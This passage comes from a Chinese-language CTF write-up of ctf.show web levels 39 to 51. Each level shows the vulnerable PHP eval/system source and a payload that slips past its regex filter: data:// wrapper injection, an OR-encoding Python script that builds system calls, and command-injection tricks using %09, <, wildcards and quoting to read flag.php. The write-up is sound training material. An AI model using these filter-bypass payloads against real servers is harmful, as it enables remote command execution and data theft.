class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关没太大变化就是把eval函数砍了，用前两关的payload同样可以绕过</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=system(&quot;tac f*&quot;);?&gt; </span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081834885.png" alt="image-20221008183404832"></p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)<br>pos()：返回数组中的当前元素的值。<br>array_reverse()：数组逆序 scandir()：获取目录下的文件<br>next()：函数将内部指针指向数组中的下一个元素<br>scandir(）获取目录文件</p><p>show_source(file, return)   如果此参数设置为true，此函数将以字符串形式返回突出显示的代码，而不是将其打印出来。默认为false</p><p>使用通过 pos(localeconv())得到点号</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210082039451.png" alt="image-20221008203943390"></p><p>然后用scandir(‘.’)获取当前文件夹文件</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210082040489.png" alt="image-20221008204050427"></p><p>我们想要的flag.php位于第三个，我们拿不到，但可以用array_reverse()进行数组反转，使第三个变为第二个，再利用next获取到值</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210082043643.png" alt="image-20221008204333588"></p><p>接着用show_source显示出来</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210082047834.png" alt="image-20221008204706775"></p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: 羽</span><br><span class="line"># @Date:   2020-09-05 20:31:22</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 22:40:07</span><br><span class="line"># @email: 1341963450@qq.com</span><br><span class="line"># @link: https://ctf.show</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_POST[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;</span><br><span class="line">        eval(&quot;echo($c);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>关于这关的wp很少，大多都是直接套羽师傅的脚本用的，但羽师傅的脚本我看不懂。。。T_T</p><p>大致原理是转码进行或运算得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://842091ac-6d32-4e64-9aaa-53458743c0a3.challenge.ctf.show/&quot;</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    c=chr(i)</span><br><span class="line">    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c, re.I)</span><br><span class="line">    if(tmp):</span><br><span class="line">        continue</span><br><span class="line">        #print(tmp.group(0))</span><br><span class="line">    else:</span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line"># eval(&quot;echo($c);&quot;);</span><br><span class="line">mya=&quot;system&quot;  #函数名 这里修改！</span><br><span class="line">myb=&quot;cat flag.php&quot;      #参数</span><br><span class="line">def myfun(k,my):</span><br><span class="line">    global ans1</span><br><span class="line">    global ans2</span><br><span class="line">    for i in range (0,len(a)):</span><br><span class="line">        for j in range(i,len(a)):</span><br><span class="line">            if(a[i]|a[j]==ord(my[k])):</span><br><span class="line">                ans1+=chr(a[i])</span><br><span class="line">                ans2+=chr(a[j])</span><br><span class="line">                return;</span><br><span class="line">for k in range(0,len(mya)):</span><br><span class="line">    myfun(k,mya)</span><br><span class="line">data1=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for k in range(0,len(myb)):</span><br><span class="line">    myfun(k,myb)</span><br><span class="line">data2=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line"></span><br><span class="line">data=&#123;&quot;c&quot;:data1+data2&#125;</span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091346317.png" alt="image-20221009134656247"></p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 20:51:55</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;代表重定向到哪里</span><br><span class="line">/dev/null 代表空设备文件</span><br><span class="line">2&gt; 表示stderr标准错误</span><br><span class="line">&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</span><br><span class="line">1 表示stdout标准输出，系统默认值是1，所以&gt;/dev/null等同于 1&gt;/dev/null</span><br><span class="line">因此，&gt;/dev/null 2&gt;&amp;1 也可以写成1&gt; /dev/null 2&gt; &amp;1</span><br></pre></td></tr></table></figure><p>本题语句执行过程为：<br>1&gt;&#x2F;dev&#x2F;null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p><p>这题主要想让我们输入的命令语句不会输出到屏幕上，我们可以在命令语句截断即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=cat flag.php%0a</span><br><span class="line">?c=cat flag.php||</span><br><span class="line">?c=cat flag.php%26</span><br><span class="line">?c=cat flag.php%26%26</span><br><span class="line">?c=cat flag.php;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php;</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091356481.png" alt="image-20221009135615422"></p><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 21:32:51</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关和上一关就过滤了cat和分号，我们可以用或和与运算符绕过</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091401241.png" alt="image-20221009140132184"></p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 21:32:01</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关相对上关仅仅就过滤了flag，我们用通配符绕就行</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac fla*%0a</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091405407.png" alt="image-20221009140502345"></p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 21:35:34</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关多过滤了一个空格，我们用%09代替即可</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fla*%0a</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091408804.png" alt="image-20221009140853726"></p><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 21:50:19</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关过滤了0-9数字星号以及空格$，我们可以用&lt;&gt;绕过，或者%09,php处理时会转化为&#x2F;t所以不会过滤，执行尾部用||</p><p>但有一点我想不明白为啥用&lt;&gt;绕过时通配符?却用不了,只能用’’绕</p><p>但用%09绕却可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$1flag.php//使用特殊变量</span><br><span class="line">cat$&#123;IFS&#125;flag.php//使用&#123;&#125;</span><br><span class="line">cat$IFS&#x27;f&#x27;lag.php//使用引号</span><br><span class="line">cat$IFS\flag.php//使用转义符</span><br><span class="line">cat$IFS?lag.php//使用通配符</span><br></pre></td></tr></table></figure><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac&lt;&gt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091425967.png" alt="image-20221009142531896"></p><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 21:59:23</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题过滤了几个命令，我们依然可以用上一关的payload绕过</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fl?g.php||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091443209.png" alt="image-20221009144332144"></p><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 22:06:20</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关又过滤了很多语句但依然可以用上关payload绕</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fl?g.php||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091447231.png" alt="image-20221009144735166"></p><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 22:22:43</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关又又又可以使用之前的payload绕过，虽然过滤了挺多参数，但我们的payload却一直不在过滤中</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fl?g.php||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091451239.png" alt="image-20221009145122167"></p><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 22:32:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关过滤了%所以我们不能%09所以用&lt;，同时&lt;&gt;过滤会与？冲突所以用’’或者\绕过</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac&lt;fla\g.php||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091512548.png" alt="image-20221009151216477"></p><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-05 22:42:52</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关把我们经常用到的tac也给过滤了，不过我们可以用nl或者rev显示出来</p><p><strong>payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=rev&lt;fla\g.php||</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210091527063.png" altp><p>将显示的字符逆序输出即可得到flag</p><p><img 